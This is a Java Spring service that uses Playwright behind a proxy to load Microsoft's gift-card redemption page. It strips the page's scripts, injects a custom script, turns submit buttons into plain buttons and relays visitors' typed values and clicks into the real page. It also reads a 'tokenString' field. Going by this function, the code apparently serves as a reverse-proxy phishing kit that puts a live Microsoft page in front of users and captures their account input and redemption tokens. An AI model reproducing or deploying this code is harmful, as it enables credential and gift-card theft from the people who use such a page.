package com.gamingzone.redeem.services;

import com.gamingzone.redeem.Field;
import com.gamingzone.redeem.HtmlUtil;
import com.gamingzone.redeem.controler.RemoteRestController;
import com.microsoft.playwright.*;
import com.microsoft.playwright.options.LoadState;
import com.microsoft.playwright.options.Proxy;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.servlet.http.HttpSession;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;

import java.util.Arrays;
import java.util.List;

@Service
public class PlaywrightHandler {

    protected Logger logger = LoggerFactory.getLogger(PlaywrightHandler.class);
    protected Playwright playwright = Playwright.create();


    @Value("${proxy.server}")
    protected String proxyServer;

    @Value("${url}")
    protected String url;

    @Value("${proxy.username}")
    protected String proxyUsername;

    @Value("${proxy.password}")
    protected String proxyPassword;



    @Value("${headless}")
    protected boolean headless;



    @Value("${custom.script}")
    protected String customScript;
    protected String homeHost;

    protected String  scriptUrl;


    @PostMapping("/click")
    public ResponseEntity<String> click(HttpServletRequest request, HttpSession session, @RequestBody Field field) {
        System.out.println(field);
        Page page = (Page) session.getAttribute("page");
        page.locator(field.getXpath()).click();
        page.waitForLoadState(LoadState.NETWORKIDLE);
        page.waitForLoadState(LoadState.LOAD);
        page.waitForLoadState(LoadState.DOMCONTENTLOADED);

        int pos = request.getRequestURL().indexOf(request.getRequestURI());

        //String next = request.getRequestURL().substring(0, pos);
        String nextUrl = "";
        System.out.println("page.title():" + page.title());
        nextUrl = homeHost ;//+ "/";
/*
        if (!(page.title().equalsIgnoreCase("Microsoft account | Redeem your code or gift card")
                || page.title().equalsIgnoreCase("Microsoft account | ממש את קוד או כרטיס המתנה שלך"))) {
            nextUrl = homeHost ;//+ "/";

        } else {
            nextUrl = homeHost + "/iframe/0/0";

        }
*/
        return new ResponseEntity<String>("{\"url\":\"" + nextUrl + "\"}", HttpStatus.OK);
    }


    public ResponseEntity<String> getPage(HttpServletRequest request, HttpServletResponse response, HttpSession session) {

        try {
            int pos = request.getRequestURL().indexOf(request.getRequestURI(),8);


            homeHost = request.getRequestURL().substring(0, pos);
            if (!homeHost.toLowerCase().contains("local")) {
                homeHost = homeHost.replace("http://", "https://");
            } else {
                headless = false;
            }
            scriptUrl = homeHost + customScript;

            Page page = (Page) session.getAttribute("page");
            String[] args = //{"Hello", "World"};
                    {
                            //'--proxy-server=200.32.51.179:8080',
                            "--proxy-server="+ proxyServer,
                            "--ignore-certificate-errors",
                            "--no-sandbox",
                            //'--disable-setuid-sandbox',
                            "--window-size=1920,1080",
                            "--disable-dev-shm-usage",
                            //   '--proxy-server='+conf.vpnServer ,
                            "--disable-accelerated-2d-canvas",
                            "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
                            "--disable-gpu"};


            if (page == null) {
                Browser browser = playwright.chromium().launch(
                        new BrowserType.LaunchOptions().setHeadless(headless)
                                .setArgs(Arrays.asList(args)).setProxy(new Proxy(proxyServer)
                                        .setUsername(proxyUsername)
                                        .setPassword(proxyPassword)));
                BrowserContext context = browser.newContext();
                page = context.newPage();
                page.navigate(url);
                page.waitForLoadState(LoadState.NETWORKIDLE);
                session.setAttribute("page", page);
            }


            // page.setDefaultTimeout(100000);

            //page.navigate("https://redeem.microsoft.com");

            //  page.waitForLoadState(LoadState.DOMCONTENTLOADED );

            page.evaluate("() => {" +
                    "for (const script of document.documentElement.querySelectorAll('script')) script.remove(); " +
                    "return document.documentElement.outerHTML; " +
                    "}"
            );


            //page.content();
            System.out.println("page.title()");
            System.out.println(page.title());
            //System.out.println(page.content());

            //model.addAttribute("page", page);
            System.out.println("request.getRequestURL()");
            System.out.println(request.getRequestURL());
            System.out.println("request.getRequestURI()");
            System.out.println(request.getRequestURI());



            System.out.println("request.getRequestURL() :" + request.getRequestURL());

            System.out.println("page.title()");
            System.out.println(page.title());

            System.out.println("scriptUrl :" + scriptUrl);
            String content ="";
            String host ="";
            if (page.title().equalsIgnoreCase("Microsoft account | ממש את קוד או כרטיס המתנה שלך")){

                List<Frame> frames = page.frames();
                Frame frame = frames.get(0);

                List<Frame> innerFrame = frame.childFrames();
                innerFrame.get(0).waitForLoadState();
                content = innerFrame.get(0).content();
                host = HtmlUtil.getFrameHost(innerFrame.get(0));


            } else{
                page.waitForLoadState(LoadState.LOAD);
                content = page.content();
                host = HtmlUtil.getHost(page);

            }
            content = content.replace("</head>", "<script " +
                    "src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js\">" +
                    "</script><script src='" + scriptUrl + "'></script></head>");
            content = content.replace("type=\"submit\"", "type=\"button\"");
            System.out.println(host);


            Document doc = Jsoup.parse(content);

            HtmlUtil.fixScript(doc, host);
            HtmlUtil.fixLinks(doc, host);
            //


            //page.waitForLoadState(d);

//                NETWORKIDLE);
            response.setHeader("Access-Control-Allow-Origin", "*");
            response.setHeader("Access-Control-Allow-Methods", "*");
            System.out.println("init doc.outerHtml()");
            //System.out.println(doc.outerHtml());
            HtmlUtil.fixMeta(doc, homeHost);
            System.out.println("doc.outerHtml():");

            System.out.println(doc.outerHtml());

            return new ResponseEntity<String>(doc.outerHtml(), HttpStatus.OK);
        }catch (Exception e) {
            e.printStackTrace();
            System.out.println("--------------------------");
            String body = "<html lang=\"he-IL\">\n" +
                    " <head>\n" +
                    "  <title>Wait</title>\n" +
                    "<script src='" + scriptUrl + "'></script>" +
                    " </head>\n" +
                    " <body></body>";


            return new ResponseEntity<String>(body, HttpStatus.OK);
        }


    }

    public ResponseEntity<String> updateFieldData(HttpSession session, Field field) {
        Page page = (Page) session.getAttribute("page");
        page.locator(field.getXpath()).clear();
        page.locator(field.getXpath()).type(field.getValue());
        return new ResponseEntity<String>("{\"ret\":\"ok\"}", HttpStatus.OK);
    }

    @GetMapping("/getTokenString")
    public ResponseEntity<String> getTokenString(HttpSession session) {
        Page page = (Page) session.getAttribute("page");
        List<Frame> frames = page.frames();
        Frame frame = frames.get(0);
        List<Frame> innerFrames = frame.childFrames();
        Frame innerFrame = innerFrames.get(0);
        String value = innerFrame.locator("//*[@id=\"tokenString\"]").inputValue();
        return new ResponseEntity<String>("{\"ret\":\"ok\" ,\"value\": \"" + value + "\" }", HttpStatus.OK);
    }


    @PostMapping("/updateTokenString")
    public ResponseEntity<String> updateTokenString(HttpSession session, @RequestBody Field field) {
        System.out.println(field);
        Page page = (Page) session.getAttribute("page");

        List<Frame> frames =                                                                                                                                                                                                                    page.frames();
//        for (Frame frame : frames) {
//            frame.waitForLoadState();
//        }


        Frame frame = frames.get(0);

        List<Frame> innerFrames = frame.childFrames();

        //innerFrame.get(0).waitForLoadState();
        Frame innerFrame = innerFrames.get(0);
        innerFrame.locator(field.getXpath()).clear();
        try {
            innerFrame.locator(field.getXpath()).type(field.getValue());
            // TimeUnit.SECONDS.sleep(1);

            String value = innerFrame.locator(field.getXpath()).inputValue();
            System.out.println("value:" + value);
            return new ResponseEntity<String>("{\"ret\":\"ok\" ,\"value\": \"" + value + "\" }", HttpStatus.OK);
        } catch (com.microsoft.playwright.PlaywrightException pe) {
            return new ResponseEntity<String>("{\"ret\":\"ok\" ,\"value\": \"\" }", HttpStatus.OK);

        }
    }

    public void logof(HttpSession session) {
        Page page = (Page) session.getAttribute("page");
        page.close();
       session.invalidate();
    }
}
